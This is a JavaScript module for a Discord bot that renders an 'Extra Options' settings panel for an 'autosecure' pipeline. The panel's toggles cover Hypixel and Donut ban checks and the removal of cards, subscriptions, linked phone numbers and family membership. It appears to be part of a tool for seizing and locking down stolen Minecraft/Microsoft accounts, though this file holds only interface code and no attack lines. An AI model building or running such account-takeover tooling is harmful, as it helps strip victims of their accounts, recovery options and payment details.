const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require("discord.js");

module.exports = async (client, username) => {
    let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [username]);
    if (settings.length === 0) {
        return {
            embeds: [{
                title: "Error :x:",
                description: "Couldn't find your settings!",
                color: 0xb2c7e0
            }],
            ephemeral: true
        };
    }
    settings = settings[0];

    const embed = new EmbedBuilder()
        .setTitle(`Extra Options`)
        .setColor(0xb2c7e0)
        .setDescription(`Granular toggles for the secure pipeline. Defaults: Linked Numbers removal **ON**, Leave Family **ON**; card and subscription removal **OFF**.`)
        .addFields(
            {
                name: "Bancheck Options",
                value: `Hypixel: ${settings.checkban_hypixel ? '✅ Enabled' : '❌ Disabled'}\nDonut: ${settings.checkban_donut ? '✅ Enabled' : '❌ Disabled'}`,
                inline: true
            },
            {
                name: "Remove Cards",
                value: settings.removecards ? "Enabled" : "Disabled",
                inline: true
            },
            {
                name: "Remove Subscriptions",
                value: settings.removesubs ? "Enabled" : "Disabled",
                inline: true
            },
            {
                name: "Remove Linked Numbers",
                value: settings.removelinkednumbers ? "Enabled" : "Disabled",
                inline: true
            },
            {
                name: "Leave Family",
                value: settings.leavefamily ? "Enabled" : "Disabled",
                inline: true
            }
        );

    const row1 = new ActionRowBuilder();
    row1.addComponents(
        new ButtonBuilder()
            .setCustomId('extra_toggle|checkban')
            .setLabel('Edit Ban Check')
            .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
            .setCustomId('extra_toggle|removecards')
            .setLabel(`${settings.removecards ? 'Disable' : 'Enable'} Remove Cards`)
            .setStyle(settings.removecards ? ButtonStyle.Danger : ButtonStyle.Success),
    );

    const row2 = new ActionRowBuilder();
    row2.addComponents(
        new ButtonBuilder()
            .setCustomId('extra_toggle|removesubs')
            .setLabel(`${settings.removesubs ? 'Disable' : 'Enable'} Remove Subs`)
            .setStyle(settings.removesubs ? ButtonStyle.Danger : ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId('extra_toggle|removelinkednumbers')
            .setLabel(`${settings.removelinkednumbers ? 'Disable' : 'Enable'} Remove Linked Numbers`)
            .setStyle(settings.removelinkednumbers ? ButtonStyle.Danger : ButtonStyle.Success)
    );

    const row3 = new ActionRowBuilder();
    row3.addComponents(
        new ButtonBuilder()
            .setCustomId('extra_toggle|leavefamily')
            .setLabel(`${settings.leavefamily ? 'Disable' : 'Enable'} Leave Family`)
            .setStyle(settings.leavefamily ? ButtonStyle.Danger : ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId('switchpanel|true')
            .setLabel('Back')
            .setStyle(ButtonStyle.Secondary)
    );

    return {
        content: null,
        embeds: [embed],
        components: [row1, row2, row3],
        ephemeral: true
    };
};
